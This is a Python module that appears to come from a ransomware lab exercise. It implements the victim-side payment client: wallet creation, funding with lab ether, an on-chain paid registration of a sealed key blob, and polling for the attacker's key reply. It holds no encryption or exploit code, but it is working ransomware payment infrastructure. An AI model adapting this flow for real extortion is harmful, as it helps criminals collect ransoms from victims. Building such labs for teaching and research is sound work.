"""The victim-side payment client (contract 3).

Ransomware talks only to this object:

    client = Client()                 # reads etc/ransom_payment.json
    client.register(sealed_blob)      # remember what goes on-chain
    client.pay(password)              # one signed, paid registerVictim tx
    reply = client.await_key()        # poll until the attacker replied

plus the wallet/exchange helpers the participant UI shows. Payloads are opaque
bytes: this module knows nothing about how the ransomware sealed its keys.
"""

import base64
import json
import time

from software.core import events, settings
from software.ransom_payment.runtime import chain, wallet

PIECE = "ransom_payment"


class Client:
    def __init__(self, cfg: dict = None, base=None):
        self.cfg = cfg if cfg is not None else settings.load(PIECE, base)
        self.base = base
        self.state = settings.state_dir(PIECE, base)
        self.wallet_file = self.state / "wallet.json"
        self.request_file = self.state / "request.json"

    # ---- facts shown by UIs ----------------------------------------------
    @property
    def chain_id(self) -> int:
        return self.cfg["chain_id"]

    @property
    def price_wei(self) -> int:
        return self.cfg["ransom_wei"]

    @property
    def price_text(self) -> str:
        return f"{wallet.format_ether(self.price_wei)} lab ETH"

    @property
    def fund_max(self) -> int:
        return self.cfg["fund_max"]

    def _emit(self, event, **fields):
        events.emit(event, piece=PIECE, base=self.base, **fields)

    # ---- wallet ------------------------------------------------------------
    def connect(self):
        return wallet.connect(self.cfg)

    def wallet_exists(self) -> bool:
        return self.wallet_file.exists() or self.wallet_file.is_symlink()

    def wallet_address(self):
        return wallet.wallet_address(self.wallet_file) if self.wallet_exists() else None

    def create_wallet(self, password: str):
        address = wallet.create_wallet(self.wallet_file, password)
        self._emit("wallet_created", address=address)
        return address

    def balance(self, address: str = None) -> int:
        return wallet.balance_wei(self.connect(), address or self.wallet_address())

    def lookup(self, address: str):
        address = wallet.validate_address(address)
        return address, wallet.balance_wei(self.connect(), address)

    def buy(self, amount: int, address: str = None):
        result = wallet.request_funds(self.connect(), address or self.wallet_address(), amount)
        self._emit("funded", amount_eth=amount)
        return result

    @staticmethod
    def format_ether(wei: int) -> str:
        return wallet.format_ether(wei)

    @staticmethod
    def validate_address(address: str) -> str:
        return wallet.validate_address(address)

    # ---- the exchange --------------------------------------------------------
    def _request(self):
        if not self.request_file.exists():
            return None
        return json.loads(self.request_file.read_text(encoding="utf-8"))

    def _save(self, request: dict):
        self.request_file.write_text(json.dumps(request, indent=2) + "\n", encoding="utf-8")

    def has_request(self) -> bool:
        return self._request() is not None

    def register(self, sealed_blob: bytes) -> dict:
        """Remember the opaque blob to post. Does not send anything yet."""
        request = self._request()
        if request is not None:
            return request
        request = {"blob_b64": base64.b64encode(sealed_blob).decode("ascii"),
                   "request_id": None, "status": "BUILT"}
        self._save(request)
        self._emit("request_built", bytes=len(sealed_blob))
        return request

    def is_paid(self) -> bool:
        request = self._request()
        return bool(request) and request.get("request_id") is not None

    def request_id(self):
        request = self._request()
        return request.get("request_id") if request else None

    def pay(self, password: str) -> dict:
        """Send the one paid registration. Never pays twice."""
        request = self._request()
        if request is None:
            raise ValueError("nothing registered yet; call register() first")
        if request.get("request_id") is not None:
            raise ValueError(f"already paid: request {request['request_id']}")
        account = chain.load_wallet_key(self.wallet_file, password)
        result = chain.register_and_pay(self.connect(), account,
                                        base64.b64decode(request["blob_b64"]))
        request.update(result)
        request["status"] = "REGISTERED"
        self._save(request)
        self._emit("paid", request_id=result["request_id"],
                   tx=result["transaction_hash"], wei=self.price_wei)
        return result

    def await_key(self, timeout: int = 600) -> bytes:
        """Poll the chain until the attacker's reply for our request appears."""
        request_id = self.request_id()
        if request_id is None:
            raise ValueError("not paid yet; no reply can come")
        config = self.connect()
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            reply = chain.get_reply(config, request_id)
            if reply:
                self._emit("key_received", request_id=request_id)
                return reply
            time.sleep(chain.POLL_SECONDS)
        raise TimeoutError("no reply posted on-chain in time")

    # ---- status ----------------------------------------------------------------
    def contract_status(self) -> dict:
        config = self.connect()
        address = chain.discover_contract(config)
        return {"address": address, "code_bytes": chain.code_size(config, address)}

    def requests(self) -> list:
        return chain.poll_requests(self.connect())
